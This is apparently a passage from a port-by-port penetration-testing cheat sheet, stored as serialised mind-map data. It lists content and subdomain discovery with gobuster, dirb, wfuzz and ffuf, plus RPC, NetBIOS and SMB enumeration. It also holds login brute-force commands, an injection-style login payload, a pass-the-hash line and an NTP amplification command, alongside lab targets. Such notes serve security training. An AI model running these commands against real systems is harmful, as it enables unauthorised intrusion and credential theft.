php,sql,txt,wpad,xlsx,xml,aspx -t 64</code>"},{"type":"list_item","depth":4,"payload":{"lines":[363,364]},"content":"specify php extention - <code>gobuster dir -u 10.10.10.16 -x php -w /usr/share/wordlists/dirb/common.txt -t 20</code>"},{"type":"list_item","depth":4,"payload":{"lines":[364,365]},"content":"use cookie - <code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 400,404,500 -u http://10.10.10.10 -o [name].log -t 25 [-k] [-c cookie] [-a useragent]</code>"},{"type":"list_item","depth":4,"payload":{"lines":[365,366]},"content":"use useragent - <code>gobuster dir --expanded --includelengeth --url http://site.htb --useragent &quot;Mozilla .....&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[366,367]},"content":"supress error codes - <code>gobuster -u http://192.168.1.101 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e</code>"},{"type":"list_item","depth":4,"payload":{"lines":[367,368]},"content":"use aginst frontpage - <code>gobuster dir -u http://10.11.1.X:80 -w /usr/share/seclists/Discovery/Web-Content/frontpage.txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[368,369]},"content":"RobotsDisallowed - <code>gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[369,370]},"content":"include username:password - <code>gobuster dir -u http://testphp.vulnweb.com/login.php -w /usr/share/wordlists/dirb/common.txt -U test -P test</code>"},{"type":"list_item","depth":4,"payload":{"lines":[370,371]},"content":"https - <code>gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 20 -e -s 200,301,302 -u https://Reel2/</code>"},{"type":"list_item","depth":4,"payload":{"lines":[371,372]},"content":"example - <code>gobuster -e -u http://IP_ADDR -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -s 200,204,301,302</code>"},{"type":"list_item","depth":4,"payload":{"lines":[372,373]},"content":"example - <code>gobuster dir -u http://10.11.1.209:8080/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -t 40 -x .php,.txt,.html,.asp -s &quot;202&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[373,374]},"content":"example - <code>gobuster -u http://10.11.1.133/ -w /usr/share/wordlists/dirb/common.txt -q -n -e</code>"},{"type":"list_item","depth":4,"payload":{"lines":[374,375]},"content":"example - <code>gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.209:80 -o recon/gobuster_10.10.10.209_80.txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[375,376]},"content":"example - <code>gobuster dir -u http://10.11.1.73:8080 -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt \\ -s '200,204,403,500' -e</code>"},{"type":"list_item","depth":4,"payload":{"lines":[376,377]},"content":"example - <code>gobuster dir -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt \\ -s '200,204,301,302,307,403,500' -e</code>"},{"type":"list_item","depth":4,"payload":{"lines":[377,378]},"content":"example - <code>gobuster dir -u http://192.168.119.127:8080/manager -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40 -x .php,.txt,.html</code>"},{"type":"list_item","depth":4,"payload":{"lines":[378,379]},"content":"example - <code>gobuster dir -u http://10.11.1.222:8080/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40 -x .php,.txt,.html,.jsp</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[381,382]},"content":"Content Discovery | dirb","children":[{"type":"list_item","depth":4,"payload":{"lines":[383,384]},"content":"example - <code>dirb http://$RHOST/ wordlist.dict</code>"},{"type":"list_item","depth":4,"payload":{"lines":[384,385]},"content":"example - <code>dirb http://$RHOST wordlist-/usr/share/wordlists/dirb/common.txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[385,386]},"content":"example - <code>dirb http://$RHOST wordlist-/usr/share/wordlists/dirb/big.txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[386,387]},"content":"example - <code>dirb http://$RHOST /usr/share/dirb/wordlists/vulns/iis.txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[387,388]},"content":"example - <code>dirb http://$RHOST/index/sips/ /usr/share/dirb/wordlists/</code>"},{"type":"list_item","depth":4,"payload":{"lines":[388,389]},"content":"example - <code>dirb http://$RHOST[:8080] -o dirb.[name].txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[389,390]},"content":"example - <code>dirb http://$RHOST/books /usr/share/seclists/Discovery/Web-Content/big.txt -l -r -S -X &quot;,.txt,.html,.php,.asp,.aspx,.jsp&quot; -o &quot;/home/kali/Documents/oscp_labs/AutoRecon-Results/10.11.1.123/scans/tcp_BOOKS_http_dirb_big.txt&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[390,391]},"content":"example - <code>dirb http://$RHOST/books /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -l -r -S -X &quot;,.txt,.html,.php,.asp,.aspx,.jsp&quot; -o &quot;/home/kali/Documents/oscp_labs/AutoRecon-Results/10.11.1.123/scans/tcp_BOOKS_http_dirb_SMALL.txt&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[391,392]},"content":"example - <code>dirb http://$RHOST:5985/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -r -S -X &quot;,.txt,.html,.php,.asp,.aspx,.jsp&quot; -o &quot;/home/kali/Documents/oscp_labs/AutoRecon-Results/10.11.1.120/scans/tcp_5985_http_dirb_dirbuster.txt&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[392,393]},"content":"scan through a proxy - <code>dirb [http://$IP/](http://172.16.0.19/) -p $IP:3129</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[394,395]},"content":"Content Discovery | wfuzz","children":[{"type":"list_item","depth":4,"payload":{"lines":[395,396]},"content":"fuzz username:password fields - <code>wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&amp;pass=FUZ2Z</code>"},{"type":"list_item","depth":4,"payload":{"lines":[396,397]},"content":"URLencode- <code>wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_site/userinfo?username=FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[397,398]},"content":"example - <code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 --hc 404 http://192.168.1.90/FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[398,399]},"content":"example - <code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test</code>"},{"type":"list_item","depth":4,"payload":{"lines":[399,400]},"content":"example - <code>wfuzz -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -d &quot;username=FUZZ'||''==='&amp;password=test&quot; --hh 51 http://shoppy.htb/login</code>"},{"type":"list_item","depth":4,"payload":{"lines":[400,401]},"content":"example - <code>wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[401,402]},"content":"example - <code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt &quot;$ip:60080/?page=mailer&amp;mail=FUZZ&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[402,403]},"content":"example - <code>wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ Recurse level 3</code>"},{"type":"list_item","depth":4,"payload":{"lines":[403,404]},"content":"example - <code>wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[404,405]},"content":"example - <code>wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc '403,404' http://doctors.htb/FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[405,406]},"content":"example - <code>wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 20 --hc 404 https://source.cereal.htb/FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[406,407]},"content":"example - <code>wfuzz -c --hh 11 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.245/?FUZZ=something</code>"},{"type":"list_item","depth":4,"payload":{"lines":[407,408]},"content":"example - <code>wfuzz -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -d &quot;username=FUZZ'||''==='&amp;password=test&quot; --hh 51 http://shoppy.htb/login</code>"},{"type":"list_item","depth":4,"payload":{"lines":[408,409]},"content":"example - <code>wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ{something not there}</code>"},{"type":"list_item","depth":4,"payload":{"lines":[409,410]},"content":"example - <code>wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[410,411]},"content":"example - <code>wfuzz -L -p 127.0.0.1:8080 -w usernames.txt -w passwords.txt -d &quot;destination=https%3A%2F%2Freel2%2Fowa%2Fauth.owa&amp;flags=0&amp;forcedownlevel=0&amp;trusted=0&amp;username=FUZZ&amp;password=FUZ2Z&amp;isUtf8=1&quot; -t 40 --hs &quot;isn't correct&quot; -H &quot;Cookie: PBack=0&quot; https://reel2/owa/auth.owa</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[412,413]},"content":"Content Discovery | ffuf","children":[{"type":"list_item","depth":4,"payload":{"lines":[413,414]},"content":"File discovery with specific extensions - <code>ffuf -w &lt;path-wordlist&gt; -u http://test-url/FUZZ -e .aspx,.php,.txt,.html</code>"},{"type":"list_item","depth":4,"payload":{"lines":[414,415]},"content":"fuzz specific file format - <code>ffuf -w &lt;path-wordlist&gt; -u http://test-url/FUZZ/backup.zip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[415,416]},"content":"Recursion - <code>ffuf -u https://test-url/FUZZ -w &lt;path-wordlist&gt; -recursion</code>"},{"type":"list_item","depth":4,"payload":{"lines":[416,417]},"content":"brute force website - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[417,418]},"content":"fuzz parameters - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url?id=FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[418,419]},"content":"fuzz headers <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url -H &quot;X-Header: FUZZ&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[419,420]},"content":"fuzz URL with POST method - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url -X POST -d &quot;var=FUZZ&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[420,421]},"content":"fuzz substring - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/testFUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[421,422]},"content":"fuzz send POST request with fuzz data - <code>ffuf -w &lt;path-wordlist&gt; -X POST -d “username=admin\\&amp;password=FUZZ” -u http://test-url/FUZZ</code>"},{"type":"list_item","depth":4,"payload":{"lines":[422,423]},"content":"filter based on status code - <code>ffuf -w &lt;path-wordlist&gt;-u https://test-url/FUZZ -fc 404,400</code>"},{"type":"list_item","depth":4,"payload":{"lines":[423,424]},"content":"filter based on amount of words - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/FUZZ -fw &lt;amount-of-words&gt;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[424,425]},"content":"filter based on amount of words - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/FUZZ -fr &lt;regex-pattern&gt;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[425,426]},"content":"filter based on amount of lines - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/FUZZ -fl &lt;amount-of-lines&gt;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[426,427]},"content":"filter based on size of response - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/FUZZ -fs &lt;size-of-response&gt;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[427,428]},"content":"time : introduce delay (in seconds) by using -p - <code>ffuf -u http://test-url/FUZZ/ -w &lt;path-wordlist&gt; -p 1</code>"},{"type":"list_item","depth":4,"payload":{"lines":[428,429]},"content":"time : control rate of sending packets - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/FUZZ -rate &lt;rate-of-sending-packets&gt;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[429,430]},"content":"time : run scan for specific time or less than specific time (in seconds) - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/FUZZ -maxtime 60</code>"},{"type":"list_item","depth":4,"payload":{"lines":[430,431]},"content":"time : limit maximum time (in seconds) per job - <code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/FUZZ -maxtime-job 60</code>"},{"type":"list_item","depth":4,"payload":{"lines":[431,432]},"content":"time : speed or slow scan by using -t (default is 40) - <code>ffuf -u http://test-url/FUZZ/ -w &lt;path-wordlist&gt; -t 1000</code>"},{"type":"list_item","depth":4,"payload":{"lines":[432,433]},"content":"Scan each domain with Wordlist1 - ffuf -u https://codingo.io/Wordlist1 -w &lt;path-wordlist&gt;:Wordlist1`"},{"type":"list_item","depth":4,"payload":{"lines":[433,434]},"content":"Scan multiple domains with Wordlist1 - <code>ffuf -u https://Wordlist2/Wordlist1 -w &lt;path-wordlist&gt;:Wordlist1 &lt;domain-list&gt;:Wordlist2</code>"},{"type":"list_item","depth":4,"payload":{"lines":[434,435]},"content":"save output by using -o and for format -of - <code>ffuf -u https://test-url/FUZZ/ -w &lt;path-wordlist&gt; -o output.html -of html</code>"},{"type":"list_item","depth":4,"payload":{"lines":[435,436]},"content":"run scan in silent mode - <code>ffuf -u https://test-url/FUZZ -w &lt;path-wordlist&gt; -s</code>"},{"type":"list_item","depth":4,"payload":{"lines":[436,437]},"content":"example - <code>ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '.html' -u &quot;http://10.13.38.21:80/FUZZ&quot; | tee &quot;recon/ffuf_10.13.38.21_80.txt&quot;</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[439,440]},"content":"Subdomain Discovery | subfinder","children":[{"type":"list_item","depth":4,"payload":{"lines":[440,441]},"content":"install - <code>go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</code>"},{"type":"list_item","depth":4,"payload":{"lines":[441,442]},"content":"example - <code>subfinder -d hackerone.com</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[443,444]},"content":"Subdomain Discovery | gobuster","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">- subdomain lists\n- grep staging-order /usr/share/seclists/Discovery/DNS/\n\n- RESULTS\n    /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt:staging-order\n    /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt:www.staging-order\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[453,454]},"content":"Subdomain Discovery | fuff","children":[{"type":"list_item","depth":4,"payload":{"lines":[454,455]},"content":"<code>ffuf -H &quot;Host: FUZZ.site.htb&quot; -u http://site.htb -c -t 50 -mc 200 -w /path/to/seclists/DNS/bitquark-subdomains-top100000.txt -o output.fuff</code>"},{"type":"list_item","depth":4,"payload":{"lines":[455,456]},"content":"<code>ffuf -w &lt;path-wordlist&gt; -u https://test-url/ -H &quot;Host: FUZZ.site.com&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[456,457]},"content":"<code>ffuf -w ~/wordlists/subdomains.txt -H &quot;Host: FUZZ.ffuf.me&quot; -u http://ffuf.me</code>"},{"type":"list_item","depth":4,"payload":{"lines":[457,458]},"content":"<code>ffuf -c -u http://devzat.htb -H &quot;HOST:FUZZ.devzat&quot; -w /user/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200</code>"},{"type":"list_item","depth":4,"payload":{"lines":[458,459]},"content":"<code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u $url-H “Host: FUZZ.website.com”</code>"},{"type":"list_item","depth":4,"payload":{"lines":[459,460]},"content":"<code>ffuf -c -u http://artcorp.htb/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host:FUZZ.artcorp.htb&quot; -mc 200</code>"},{"type":"list_item","depth":4,"payload":{"lines":[460,461]},"content":"<code>ffuf -u http://pets.devzat.htb/FUZZ -w /path/to/dirbuster/directory-list-2.3-medium.txt -fs 510</code>"},{"type":"list_item","depth":4,"payload":{"lines":[461,462]},"content":"<code>ffuf -u http://pets.devzat.htb/FUZZ -w /path/to/seclists/Discover/Web-Content/raft-large-files-lowercase.txt -fs 510</code>"},{"type":"list_item","depth":4,"payload":{"lines":[462,463]},"content":"<code>ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '' -u &quot;http://10.13.38.21:5985/FUZZ&quot; | tee &quot;recon/ffuf_10.13.38.21_5985.txt&quot;</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[465,466]},"content":"Subdomain Discovery | wfuzz","children":[{"type":"list_item","depth":4,"payload":{"lines":[466,467]},"content":"<code>wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u &quot;http://shoppy.htb/&quot; -H &quot;Host: FUZZ.shoppy.htb&quot; --hl 7</code>"},{"type":"list_item","depth":4,"payload":{"lines":[467,468]},"content":"<code>wfuzz -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -H &quot;Host: FUZZ.mango.htb&quot; --hc 403,400 -t 150 10.10.10.162</code>"},{"type":"list_item","depth":4,"payload":{"lines":[468,469]},"content":"<code>wfuzz -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -H &quot;Host: FUZZ.mango.htb&quot; --hc 403,400 -t 80 10.10.10.162</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[471,472]},"content":"Subdomain Discovery | bash","children":[{"type":"list_item","depth":4,"payload":{"lines":[472,473]},"content":"<code>for sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[476,477]},"content":"vhost discovery | gobuster","children":[{"type":"list_item","depth":4,"payload":{"lines":[477,478]},"content":"<code>gobuster vhost -u mango.htb -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[478,479]},"content":"<code>gobuster vhost -u site.htb -w /usr/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -v</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[480,481]},"content":"vhost discovery | ffuf","children":[{"type":"list_item","depth":4,"payload":{"lines":[481,482]},"content":"<code>ffuf -w &lt;path-vhosts&gt; -u https://test-url -H &quot;Host: FUZZ&quot;</code>"}]}]},{"type":"heading","depth":2,"payload":{"lines":[483,484]},"content":"Exploitation","children":[{"type":"heading","depth":3,"payload":{"lines":[485,486]},"content":"clone site | wget","children":[{"type":"list_item","depth":4,"payload":{"lines":[486,487]},"content":"<code>wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://site-to-download.com</code>"},{"type":"list_item","depth":4,"payload":{"lines":[487,488]},"content":"<code>wget -mk -nH</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[489,490]},"content":"clone site | httrack","children":[{"type":"list_item","depth":4,"payload":{"lines":[490,491]},"content":"<code>apt install httrack</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[492,493]},"content":"Payload Repository:","children":[{"type":"list_item","depth":4,"payload":{"lines":[493,494]},"content":"<code>git clone https://github.com/payloadbox/directory-payload-list.git</code>"}]}]}]},{"type":"heading","depth":1,"payload":{"lines":[497,498]},"content":"88 » KERBEROS","children":[{"type":"heading","depth":2,"payload":{"lines":[498,499]},"content":"Enumeration"},{"type":"heading","depth":2,"payload":{"lines":[500,501]},"content":"Exploitation"}]},{"type":"heading","depth":1,"payload":{"lines":[502,503]},"content":"111 » NFS+RPCBIND","children":[{"type":"heading","depth":2,"payload":{"lines":[503,504]},"content":"Enumeration","children":[{"type":"list_item","depth":3,"payload":{"lines":[504,505]},"content":"<code>mount -t nfs $ip:/ /mnt -o nolock</code>"}]},{"type":"heading","depth":2,"payload":{"lines":[505,506]},"content":"Exploitation"}]},{"type":"heading","depth":1,"payload":{"lines":[512,513]},"content":"123 » NTP","children":[{"type":"heading","depth":2,"payload":{"lines":[513,514]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[514,515]},"content":"NMAP","children":[{"type":"list_item","depth":4,"payload":{"lines":[515,516]},"content":"<code>nmap -sU -sV --script &quot;ntp* and (discovery or vuln) and not (dos or brute)&quot; -p 123 $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[516,517]},"content":"<code>nmap -n -Pn -sU -p 123 --script=ntp-info -oA %s/%s_ntp %s</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[518,519]},"content":"ntpq","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">ntpq -c readlist &lt;IP_ADDRESS>\nntpq -c readvar &lt;IP_ADDRESS>\nntpq -c peers &lt;IP_ADDRESS>\nntpq -c associations &lt;IP_ADDRESS>\nntpdc -c monlist &lt;IP_ADDRESS>\nntpdc -c listpeers &lt;IP_ADDRESS>\nntpdc -c sysinfo &lt;IP_ADDRESS>\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[528,529]},"content":"ntp.conf","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">Examine conf file\n</code></pre>\n"}]}]},{"type":"heading","depth":2,"payload":{"lines":[533,534]},"content":"Exploitation","children":[{"type":"heading","depth":3,"payload":{"lines":[534,535]},"content":"ntp amplification attack","children":[{"type":"list_item","depth":4,"payload":{"lines":[535,536]},"content":"<code>ntpdc -n -c monlist $ip</code>"}]}]}]},{"type":"heading","depth":1,"payload":{"lines":[538,539]},"content":"135 » RPC","children":[{"type":"heading","depth":2,"payload":{"lines":[539,540]},"content":"135 - INFO","children":[{"type":"fence","depth":3,"content":"<pre class=\"language-text\"><code class=\"language-text\">You can access the RPC locator service by using four protocol sequences:\nncacn_ip_tcp and ncadg_ip_udp (TCP and UDP port 135)\nncacn_np (the \\pipe\\epmapper named pipe via SMB)\nncacn_http (RPC over HTTP via TCP port 80, 593, and others)\n</code></pre>\n"}]},{"type":"heading","depth":2,"payload":{"lines":[546,547]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[547,548]},"content":"NMAP","children":[{"type":"list_item","depth":4,"payload":{"lines":[548,549]},"content":"<code>NMAP $ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[549,550]},"content":"rpcdump","children":[{"type":"list_item","depth":4,"payload":{"lines":[550,551]},"content":"<code>rpcdump -p 135 $ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[551,552]},"content":"rpcclint","children":[{"type":"heading","depth":4,"payload":{"lines":[552,553]},"content":"connect to RPC - Null Authentication","children":[{"type":"list_item","depth":5,"payload":{"lines":[553,554]},"content":"<code>rpcclient -U &quot;&quot; -N $ip</code>"},{"type":"list_item","depth":5,"payload":{"lines":[554,555]},"content":"<code>rpcclient //machine.htb -U</code>"}]},{"type":"heading","depth":4,"payload":{"lines":[555,556]},"content":"connect to RPC - PTH","children":[{"type":"list_item","depth":5,"payload":{"lines":[556,557]},"content":"<code>domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb --pw\u0002nt-hash</code>"}]},{"type":"heading","depth":4,"payload":{"lines":[557,558]},"content":"list users","children":[{"type":"list_item","depth":5,"payload":{"lines":[558,559]},"content":"<code>rpcclient $&gt; enumdomusers</code>"}]},{"type":"heading","depth":4,"payload":{"lines":[559,560]},"content":"query specific user","children":[{"type":"list_item","depth":5,"payload":{"lines":[560,561]},"content":"<code>rpcclient $&gt; queryuser 0x1f4</code>"}]},{"type":"heading","depth":4,"payload":{"lines":[561,562]},"content":"list user descriptions","children":[{"type":"list_item","depth":5,"payload":{"lines":[562,563]},"content":"<code>rpcclient $&gt; querydispinfo</code>"}]}]},{"type":"heading","depth":3,"payload":{"lines":[563,564]},"content":"smbclient","children":[{"type":"heading","depth":4,"payload":{"lines":[564,565]},"content":"list smb shares","children":[{"type":"list_item","depth":5,"payload":{"lines":[565,566]},"content":"<code>smbclient -L $ip</code>"}]}]},{"type":"heading","depth":3,"payload":{"lines":[567,568]},"content":"ridenum","children":[{"type":"list_item","depth":4,"payload":{"lines":[568,569]},"content":"RID Cycling - Null Sessions - <code>ridenum.py $ip 500 50000 dict.txt</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[570,571]},"content":"test for null Sessions","children":[{"type":"list_item","depth":4,"payload":{"lines":[571,572]},"content":"Windows - <code>net use \\\\$ip\\IPC$ &quot;&quot; /u:&quot;&quot;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[572,573]},"content":"Linux - <code>smbclient -L //$ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[574,575]},"content":"Enumerate users using MSRPC","children":[{"type":"list_item","depth":4,"payload":{"lines":[575,576]},"content":"requires access to IPC<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>−</mo><mi mathvariant=\"normal\">‘</mi><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi></mrow><annotation encoding=\"application/x-tex\">- `//</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">−</span><span class=\"mord\">‘//</span></span></span></span>ip/&lt;share_name&gt;`"}]},{"type":"heading","depth":3,"payload":{"lines":[577,578]},"content":"lookupsid.py","children":[{"type":"list_item","depth":4,"payload":{"lines":[578,579]},"content":"<code>lookupsid.py $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[579,580]},"content":"<code>lookupsid.py &lt;user&gt;:&lt;password&gt;@$ip</code>"}]}]},{"type":"heading","depth":2,"payload":{"lines":[582,583]},"content":"Exploitation","children":[{"type":"paragraph","depth":3,"payload":{"lines":[583,584]},"content":"ADD CONTENT"}]}]},{"type":"heading","depth":1,"payload":{"lines":[585,586]},"content":"137 » Netbios","children":[{"type":"heading","depth":2,"payload":{"lines":[586,587]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[587,588]},"content":"nmap","children":[{"type":"list_item","depth":4,"payload":{"lines":[588,589]},"content":"<code>sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[589,590]},"content":"<code>nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 $ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[591,592]},"content":"smblookup","children":[{"type":"list_item","depth":4,"payload":{"lines":[592,593]},"content":"enum hostname - <code>smblookup -A $ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[594,595]},"content":"nbtscan","children":[{"type":"list_item","depth":4,"payload":{"lines":[595,596]},"content":"<code>nbtscan $ip/30</code>"},{"type":"list_item","depth":4,"payload":{"lines":[596,597]},"content":"<code>nbtscan -r $ip/24</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[598,599]},"content":"recusively download files","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">smb: > recurse ON\nsmb: > prompt OFF\nsmb: > mget *```\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[605,606]},"content":"net use","children":[{"type":"list_item","depth":4,"payload":{"lines":[606,607]},"content":"<code>net use \\\\$ip\\IPC$</code>"}]}]},{"type":"heading","depth":2,"payload":{"lines":[608,609]},"content":"Exploitation","children":[{"type":"paragraph","depth":3,"payload":{"lines":[609,610]},"content":"ADD CONTENT"}]}]},{"type":"heading","depth":1,"payload":{"lines":[611,612]},"content":"139,445 » SMB","children":[{"type":"heading","depth":2,"payload":{"lines":[612,613]},"content":"Enumeration","children":[{"type":"fence","depth":3,"content":"<pre class=\"language-text\"><code class=\"language-text\">Questions\n    - Do you have creds?\n    - Can you access shares?\n    - Are there any exploitable MSxx-xxx versions?\n    - Is it worth burning MSF strike?\n</code></pre>\n"},{"type":"heading","depth":3,"payload":{"lines":[620,621]},"content":"nmap","children":[{"type":"list_item","depth":4,"payload":{"lines":[621,622]},"content":"os discovery - <code>sudo nmap -v -sSVC -p 445 --script smb-os-discovery $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[622,623]},"content":"open smb shares - <code>nmap -Pn --script smb-enum-shares -p 139,445 10.11.1.146</code>"},{"type":"list_item","depth":4,"payload":{"lines":[623,624]},"content":"open smb shares - <code>nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24</code>"},{"type":"list_item","depth":4,"payload":{"lines":[624,625]},"content":"enum smb users <code>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[625,626]},"content":"vulnerable smb servers - <code>nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[626,627]},"content":"list all smb scripts - <code>ls -l /usr/share/nmap/scripts/smb*</code>"},{"type":"list_item","depth":4,"payload":{"lines":[627,628]},"content":"vuln scans - <code>nmap 